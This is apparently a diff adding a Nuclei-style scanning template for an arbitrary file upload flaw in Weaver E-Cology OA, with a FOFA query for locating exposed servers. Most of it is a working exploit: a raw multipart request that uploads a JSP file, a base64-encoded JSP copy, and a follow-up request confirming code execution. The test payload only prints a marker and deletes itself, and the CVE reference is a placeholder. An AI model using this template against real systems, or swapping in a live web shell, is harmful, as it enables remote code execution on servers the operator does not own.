@@ -1,0 +1,56 @@
+id: weaver-e-cology-skinaction-file-upload
+
+info:
+  name: 泛微OA E-Cology mobile.skin.SkinAction 组件 Action.jsp 任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body = "/wui/common/css/w7OVFont_wev8.css" || header="testBanCookie" || body="/wui/common/css/w7OVFont.css" || body="/js/ecology8" || body="alert('高效源于协同')" || body="wui/common/css/w7OVFont_wev8.css"||(body="weaver"&&body="ecology") || (header="ecology_JSessionId"&&body="login/Login.jsp")||body="/wui/index.html"||body="jquery_wev8"|| body="index_wev8"||title="e-cology运维管理平台"||body="/build/passport/static/js/lib.js" && body="/build/ecodesdk/static/js/lib.js"||body="/general/login/index.php"
+      reference: https://nvd.nist.gov/vuln/detail/CVE-2025-XXXXX
+      该漏洞源于 E-Cology 系统中 mobile.skin.SkinAction 类的 Action.jsp 接口未正确校验文件上传参数，攻击者可通过构造包含恶意 payload 的上传请求，在目标服务器写入任意可执行文件，最终实现远程代码执行。
+  tags: 泛微OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="upload"; filename="NTest.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    >
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="upload"; filename=""
+    Content-Type: text/plain;base64
+
+    PCUgb3V0LnByaW50bG4oIkR1ZGVTdWl0ZSIpOyBuZXcgamF2YS5pby5GaWxlKGFwcGxpY2F0aW9uLmdldFJlYWxQYXRoKHJlcXVlc3QuZ2V0U2VydmxldFBhdGgoKSkpLmRlbGV0ZSgpOyAlPg==
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW
+    Content-Disposition: form-data; name="upload"; filename=""
+    Content-Type: application/octet-stream
+
+
+    ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
